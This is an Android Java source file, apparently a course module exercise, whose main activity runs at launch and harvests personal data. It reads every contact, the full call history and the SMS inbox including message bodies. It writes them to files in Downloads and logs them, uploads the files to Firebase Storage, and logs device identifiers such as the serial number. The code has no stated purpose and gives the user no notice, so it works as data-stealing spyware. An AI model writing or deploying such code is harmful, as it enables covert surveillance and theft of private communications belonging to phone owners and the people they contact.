package com.example.Modul6;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;

import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    String currentTime;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        requestPermission();

        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
        currentTime = sdf.format(new Date());

        getContactList();
        getCallDetails();
        getSmsDetails();

        getINfo();

    }

    private void getINfo() {
        Log.d("Build1","OS Version: " + Build.VERSION.RELEASE + "\n");
        Log.d("Build1","OS API Level: " + Build.VERSION.SDK_INT + "\n");
        Log.d("Build1","Device Manufacturer: " + Build.MANUFACTURER + "\n");
        Log.d("Build1", "Device Model: " + Build.MODEL + "\n");
        Log.d("Build1", "Device Name: " + Build.DEVICE + "\n");
        Log.d("Build1","Product Name: " + Build.PRODUCT + "\n");
        Log.d("Build1", "Hardware Name: " + Build.HARDWARE + "\n");
        Log.d("Build1","Serial Number: " + Build.SERIAL + "\n");

    }


    private void requestPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED ||
                ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, 1);
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_CALL_LOG}, 1);
        }

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, 1);
        }

    }

    private void uploadFirebase(File file) {
        // Get an instance of FirebaseStorage
        FirebaseStorage storage = FirebaseStorage.getInstance();
        // Create a reference to the file you want to upload
        StorageReference fileRef = storage.getReference().child(
            "data" + currentTime+ "/"+ file.getName());

        // Get the path of the file to be uploaded
        String filePath = file.getPath();
        // Convert the file path to a Uri
        Uri fileUri = Uri.fromFile(new File(filePath));

        // Upload file to Firebase Storage
        fileRef.putFile(fileUri)
                .addOnSuccessListener(taskSnapshot -> {
                    // File uploaded successfully
                    Log.d("uploadFirebase", "File uploaded successfully");
                })
                .addOnFailureListener(e -> {
                    // Handle unsuccessful uploads
                    Log.e("uploadFirebase", "Error uploading file", e);
                });
    }

    private void getContactList() {
        String namefile = "contacts" + currentTime + ".txt";

        // Create a new ContentValues object to store the metadata of the new file
        ContentValues values = new ContentValues();
        values.put(MediaStore.MediaColumns.DISPLAY_NAME, namefile);
        values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
        values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);

        // Insert the new file into the Downloads directory using the MediaStore API
        Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);

        try {
            // Open an output stream to the newly created file
            OutputStream outputStream = getContentResolver().openOutputStream(uri);

            // Query the contact list to retrieve phone numbers
            Cursor cursor = getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);

            // Loop through the result set of the query
            while (cursor.moveToNext()) {
                // Retrieve the phone number value from the current row of the result set
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                Log.d("getContactList", name + ", " + phone + "\n");
                // Create a string by concatenating name, phone, and a newline character
                String line = name + ", " + phone + "\n";
                // Write the string to the output stream as a byte array
                outputStream.write(line.getBytes());
            }
            cursor.close();
            outputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        // Create a File object for the desired file in the Downloads directory
        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);
        // Upload the file to Firebase
        uploadFirebase(file);
    }
    private void getCallDetails() {
        String namefile = "callDetails" + currentTime + ".txt";

        // Creating files using the MediaStore class
        ContentValues values = new ContentValues();
        values.put(MediaStore.MediaColumns.DISPLAY_NAME, namefile);
        values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
        values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
        
        // Insert the new file into the Downloads directory using the MediaStore API
        Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);

        try {
            // Open an output stream to the newly created file
            OutputStream outputStream = getContentResolver().openOutputStream(uri);

            // Get the cursor to query the call history
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI, null, null, null, 
                CallLog.Calls.DATE + " DESC");

            // Iterate over the cursor to retrieve the contacts
            while (cursor.moveToNext()) {
                // Retrieve the call details from the current row of the cursor
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));

                SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
                String dateString = formatter.format(new Date(Long.parseLong(date)));

                // Format the call details as a comma-separated string and write it to the output stream
                String line = number + ", " + name +", "+ duration +", "+ type +", "+ date + "\n";
                outputStream.write(line.getBytes());

                Log.d("getCallDetails", "Name: " + name + " Number: " + number + " Date: " + dateString + " Duration: " + duration + " Type: " + type);
            }
            cursor.close();
            outputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        // Create a File object for the desired file in the Downloads directory
        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);
        // Upload the file to Firebase
        uploadFirebase(file);
    }
    private void getSmsDetails() {
        String namefile = "SmsDetails" + currentTime + ".txt";

        // Creating files using the MediaStore class
        ContentValues values = new ContentValues();
        values.put(MediaStore.MediaColumns.DISPLAY_NAME, namefile);
        values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
        values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);

        // Insert the new file into the Downloads directory using the MediaStore API
        Uri uri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, values);

        try {
            // Open an output stream to the newly created file
            OutputStream outputStream = getContentResolver().openOutputStream(uri);

            // Get the cursor to query the message
            Cursor cursor = getContentResolver().query(
                Uri.parse("content://sms/inbox"), null, null, null, null);

            // Iterate over the cursor to retrieve the contacts
            while (cursor.moveToNext()) {
                // Retrieve the call details from the current row of the cursor
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                String date = cursor.getString(cursor.getColumnIndex("date"));

                SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm:ss");
                String dateString = formatter.format(new Date(Long.parseLong(date)));

                // Format the call details as a comma-separated string and write it to the output stream
                String line = address + ", " + body +", "+ date + "\n";
                outputStream.write(line.getBytes());


                Log.d("getSmsDetails", "Address: " + address + " Date: " + dateString + " Body: " + body);
            }
            cursor.close();
            outputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Create a File object for the desired file in the Downloads directory
        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);
        // Upload the file to Firebase  
        uploadFirebase(file);
    }


}